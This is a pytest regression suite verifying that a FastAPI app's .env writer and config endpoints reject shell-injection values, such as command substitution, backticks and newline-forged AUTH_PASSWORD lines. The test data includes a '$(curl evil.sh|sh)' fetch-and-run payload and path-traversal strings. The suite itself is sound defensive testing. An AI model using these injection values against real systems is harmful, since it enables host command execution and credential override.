"""Regression coverage for #1312: .env value injection → host command execution.

Before the fix, ``write_env()`` persisted values verbatim, so a crafted
``POST /config`` (or the unauthenticated pre-setup ``POST /config/setup``)
could write ``$(cmd)``, backticks or newlines into .env — which the Makefile
then *sourced*, executing the payload as the host user on the next ``make``
invocation. Newline injection additionally forged extra ``KEY=`` lines, and
``read_env()``'s last-wins parsing let an injected ``AUTH_PASSWORD`` override
the real one.
"""

import os

import pytest
import routers.config as config_router
from fastapi.testclient import TestClient
from services.env_file import read_env, validate_env_value, write_env

# ── write_env(): universal safety net ────────────────────────────────────────


@pytest.mark.parametrize(
    "bad_value",
    [
        "x\nAUTH_PASSWORD=forged",
        "x\rAUTH_PASSWORD=forged",
        "$(touch /tmp/pwned)",
        "x$(id)y",
        "${HOME}",
        "`id`",
        'with"double',
        "with'single",
        "tab\tseparated",
        "null\x00byte",
    ],
)
def test_write_env_rejects_dangerous_values(persisted_env, bad_value):
    """Every value write_env() persists must be inert under shell sourcing."""
    with pytest.raises(ValueError):
        write_env({"OBSIDIAN_VAULT_PATH": bad_value})
    # Nothing may be written — not even a partial file.
    assert persisted_env.read_text() == ""


def test_write_env_rejects_injection_on_any_key(persisted_env):
    """The check applies to every key, not just known/config ones."""
    with pytest.raises(ValueError):
        write_env({"SOME_UNKNOWN_KEY": "$(id)"})
    assert persisted_env.read_text() == ""


def test_write_env_accepts_legit_values(persisted_env):
    """Real-world .env values (spaces, cron fields, bcrypt $) still pass."""
    write_env(
        {
            "OBSIDIAN_VAULT_PATH": "/home/user/My Vault",
            "AUTH_PASSWORD": "$2b$12$LJ3m4y9Q2mQ0f8XwV1JkOeJ3m4y9Q2mQ0f8XwV1JkOeJ3m4y9Q2mQ0f",
            "BACKUP_SCHEDULE": "0 3 * * *",
            "SECRET_KEY": "",
        }
    )
    env = read_env()
    assert env["OBSIDIAN_VAULT_PATH"] == "/home/user/My Vault"
    assert env["AUTH_PASSWORD"].startswith("$2b$")
    assert env["BACKUP_SCHEDULE"] == "0 3 * * *"


def test_write_env_allows_json_quotes_only_for_whitelisted_keys(persisted_env):
    write_env({"XP_TABLE_JSON": '{"note_created": 10}'})
    assert read_env()["XP_TABLE_JSON"] == '{"note_created": 10}'
    with pytest.raises(ValueError):
        write_env({"GEMINI_API_KEY": 'has"quote'})


# ── validate_env_value(): per-key validators at the API boundary ─────────────


def test_validate_env_value_normalizes_paths():
    assert validate_env_value("OBSIDIAN_VAULT_PATH", "/tmp//vault/") == "/tmp/vault"
    assert validate_env_value("OBSIDIAN_VAULT_PATH", "~/Documentos/notas") == "~/Documentos/notas"


def test_validate_env_value_accepts_spaces_in_paths():
    # Paths legitimately contain spaces — they are a blocklist check, not a
    # charset whitelist (unicode names keep working too).
    assert validate_env_value("OBSIDIAN_VAULT_PATH", "/home/user/Música Vault").endswith("Vault")


@pytest.mark.parametrize(
    "key,value",
    [
        ("OBSIDIAN_VAULT_PATH", "-rf /"),  # leading dash is not a path
        ("OBSIDIAN_VAULT_PATH", "C:\\vault"),
        ("DAILY_NOTES_FOLDER", "/etc"),  # must stay relative
        ("DAILY_NOTES_FOLDER", "../outside"),
        ("TELEGRAM_ALLOWED_USER_ID", "123abc"),
        ("GOOGLE_REDIRECT_URI", "not-a-url"),
        ("GOOGLE_REDIRECT_URI", "ftp://example.com"),
        ("AI_SERVICE_ENABLED", "maybe"),
        ("APP_ENV", "Development"),
        ("GEMINI_API_KEY", "key with spaces"),
    ],
)
def test_validate_env_value_per_key_rejections(key, value):
    with pytest.raises(ValueError):
        validate_env_value(key, value)


@pytest.mark.parametrize(
    "key,value",
    [
        ("TELEGRAM_ALLOWED_USER_ID", "123456789"),
        ("GOOGLE_REDIRECT_URI", "http://localhost:8000/integrations/google/callback"),
        ("OPENAI_BASE_URL", "https://api.stdcmpt.com/v1"),
        ("AI_SERVICE_ENABLED", "false"),
        ("APP_ENV", "production"),
        ("LLM_MODEL", "openrouter:anthropic/claude-3-opus"),
        ("GEMINI_API_KEY", "AIzaSy-aB_c.dEfG"),
        ("AUTH_PASSWORD", "$2b$12$LJ3m4y9Q2mQ0f8XwV1JkOeJ3m4y9Q2mQ0f8XwV1JkOeJ3m4y9Q2mQ0f"),
        ("TELEGRAM_BOT_TOKEN", "123456:ABC-def_ghi"),
        ("UNKNOWN_KEY", "anything goes"),
        ("GEMINI_API_KEY", ""),  # empty = cleared, always allowed
    ],
)
def test_validate_env_value_accepts_valid(key, value):
    assert validate_env_value(key, value) == value


# ── POST /config: rejected values must produce a 400 ────────────────────────


def test_post_config_rejects_newline_injection(client: TestClient, persisted_env):
    """Issue verification: POST /config {"obsidian_vault_path":"x\\nAUTH_PASSWORD=y"} → 400."""
    resp = client.post("/config", json={"obsidian_vault_path": "x\nAUTH_PASSWORD=y"})
    assert resp.status_code == 400
    # .env must be untouched — the forged AUTH_PASSWORD line never landed.
    assert persisted_env.read_text() == ""
    assert read_env() == {}


def test_post_config_rejects_command_substitution(client: TestClient, persisted_env):
    resp = client.post("/config", json={"obsidian_vault_path": "$(curl evil.sh|sh)"})
    assert resp.status_code == 400
    assert persisted_env.read_text() == ""


def test_post_config_rejects_per_key_violations(client: TestClient, persisted_env):
    resp = client.post("/config", json={"telegram_allowed_user_id": "not-a-number"})
    assert resp.status_code == 400
    assert "telegram_allowed_user_id" in resp.json()["detail"]
    assert persisted_env.read_text() == ""


def test_post_config_still_accepts_valid_values(client: TestClient, persisted_env):
    resp = client.post("/config", json={"obsidian_vault_path": "/tmp/new_vault"})
    assert resp.status_code == 200
    assert read_env()["OBSIDIAN_VAULT_PATH"] == "/tmp/new_vault"


# ── POST /config/setup (unauthenticated pre-setup) ──────────────────────────


def test_setup_rejects_malicious_vault_path(client: TestClient, persisted_env):
    """Pre-setup, an unauthenticated caller must not poison .env either."""
    resp = client.post(
        "/config/setup",
        json={"auth_password": "pw1234", "obsidian_vault_path": "x\nAUTH_PASSWORD=attacker"},
    )
    assert resp.status_code == 400
    # Setup aborted before write_env: no AUTH_PASSWORD/SECRET_KEY persisted.
    assert persisted_env.read_text() == ""
    assert read_env() == {}


def test_setup_happy_path_persists_safe_values(client: TestClient, persisted_env, monkeypatch):
    """bcrypt hashes ($-heavy) and generated secrets must still write fine."""
    # perform_setup mutates process-global settings/os.environ on success —
    # restore them on teardown so the suite's no-auth defaults survive
    # (_effective_auth_password falls back to settings.auth_password).
    for attr in ("auth_password", "secret_key", "obsidian_vault_path"):
        monkeypatch.setattr(config_router.settings, attr, getattr(config_router.settings, attr))
    monkeypatch.delenv("OBSIDIAN_VAULT_PATH", raising=False)

    resp = client.post(
        "/config/setup",
        json={"auth_password": "pw1234", "obsidian_vault_path": "/tmp/vault"},
    )
    assert resp.status_code == 200
    env = read_env()
    assert env["AUTH_PASSWORD"].startswith("$2")
    assert env["SECRET_KEY"]
    assert env["OBSIDIAN_VAULT_PATH"] == "/tmp/vault"
    assert os.environ.get("OBSIDIAN_VAULT_PATH") == "/tmp/vault"
